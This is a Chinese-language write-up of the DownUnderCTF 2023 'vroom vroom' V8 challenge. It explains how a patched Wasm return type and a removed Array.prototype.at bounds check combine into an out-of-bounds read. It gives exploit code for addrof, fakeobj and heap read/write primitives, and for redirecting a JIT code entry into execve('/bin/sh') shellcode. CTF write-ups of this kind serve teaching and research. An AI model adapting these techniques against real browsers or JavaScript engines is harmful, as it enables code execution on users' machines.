# DownUnderCTF 2023 vroom vroom Writeup

## 题目简述

题目使用 V8 11.6.205 的定制 `d8`。补丁一方面把 WebAssembly 的 `f32/f64` 返回值错误标注为 `PlainNumber`，使 TurboFan 静态类型排除 NaN；另一方面移除了优化版 `Array.prototype.at` 的额外 `CheckBounds`。两处修改组合后，可让优化器认为索引恒为 0，而运行时索引实际为 1，形成越界读。

## 解题过程

先创建一个原样返回 `f32` 的 WebAssembly 函数，并传入 `NaN`。经过以下运算链后，TurboFan 推导最终值只能是 0，但漏洞构建的实际值为 1：

```javascript
let z = instance.exports.evil(NaN);
z = Math.sign(z);
z >>= 30;
z += 1;
z = -z;
z = Math.max(z, 0);
```

对两个相邻数组调用 `a.at(z * 7)` 或 `a.at(z * 8)`。优化器因静态索引为 0 而消除边界检查；实际索引 7、8 则越过两元素数组，读到后方对象布局。三种经过 JIT 预热的变体分别实现：

- `_leak`：泄漏相邻浮点数组的压缩堆地址。
- `_addrof(object)`：把对象数组元素的 tagged pointer 当作 double 读出。
- `_fakeobj(bits)`：把攻击者控制的 double 位模式当作对象引用返回。

利用泄漏构造一个伪造 JSArray，把 length 设为较大值，得到稳定 OOB 数组。官方构建中的关键相对索引为：

```javascript
const offset = {
  fltElements: 41,
  objElements: 48,
  rdwElements: 57,
};
```

先让浮点数组和对象数组共享 elements，实现 `addrof`；再改写 `rdw.elements`，实现压缩堆内任意读写：

```javascript
function heapRead(address) {
  let saved = oob[offset.rdwElements];
  let tagged = address - 8n + 1n;
  oob[offset.rdwElements] = itof((tagged << 32n) + 0x219n);
  let value = ftoi(rdw[0]);
  oob[offset.rdwElements] = saved;
  return value;
}
```

`pwn` 函数中的八个浮点常量按位编码了 `execve("/bin/sh",0,0)`。预热该函数后，从 JSFunction 偏移 `0x18` 取得 Code 对象，再读 `code+0x10` 的入口地址。机器码中 shellcode 位于正常入口后 `0x56`，因此写回：

```javascript
heapWrite(code + 0x10n, entry + 0x56n);
pwn();
```

调用跳入 shellcode，读取：

```text
DUCTF{BuT_wHy_i5_v8_CaR_tH3mED_tH0Ugh_abf86c295245c2523c51384afd345741}
```

## 方法总结

本题不是单独的 Wasm bug 或 `Array.at` bug：错误的 `PlainNumber` 类型让优化器排除 NaN，缺失的硬化边界检查让错误范围推导直接变成 OOB。随后利用 V8 指针压缩布局构造 `addrof`、fake object 和堆读写，最终修改 JIT Code 入口。所有偏移都与题目给定版本和快照绑定。
